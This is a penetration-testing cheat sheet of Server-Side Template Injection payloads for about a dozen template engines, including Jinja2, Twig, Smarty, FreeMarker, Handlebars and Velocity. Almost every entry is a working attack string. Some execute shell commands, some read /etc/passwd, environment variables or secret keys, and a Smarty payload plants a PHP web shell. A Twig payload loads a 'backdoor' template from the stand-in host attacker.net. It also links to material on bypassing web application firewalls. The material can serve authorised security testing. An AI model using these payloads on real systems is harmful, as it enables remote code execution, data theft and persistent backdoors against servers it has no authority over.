---
description: >-
  Cheat Sheet for Server Side Template Injection from:
  https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68
---

# Server Side Template Injection \(SSTI\)

#### Polyglot:

```text
${{<%[%'"}}%\
```

#### FreeMarker \(Java\):

```text
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }
```

#### \(Java\):

```text
${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

#### Twig \(PHP\):

```text
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

#### Smarty \(PHP\):

```text
{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
`
```

#### Handlebars \(NodeJS\):

```text
wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

#### Velocity:

```text
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

#### ERB \(Ruby\):

```text
<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

#### Django Tricks \(Python\):

```text
{% debug %} {{settings.SECRET_KEY}}
```

#### Tornado \(Python\):

```text
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
```

#### Mojolicious \(Perl\):

```text
<%= perl code %>
<% perl code %>
```

#### Flask/Jinja2: Identify:

```text
{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}
```

#### Flask/Jinja2:

```text
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

#### Jade:

```text
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

#### Razor \(.Net\):

```text
@(1+2)
@{// C# code}
```

#### This is a useful read on how to avoid WAF with SSTI:

[https://gusralph.info/jinja2-ssti-research/](https://gusralph.info/jinja2-ssti-research/)

#### Still haven't found what you are looking for? Try These:

[book.hacktrickz.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

[Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

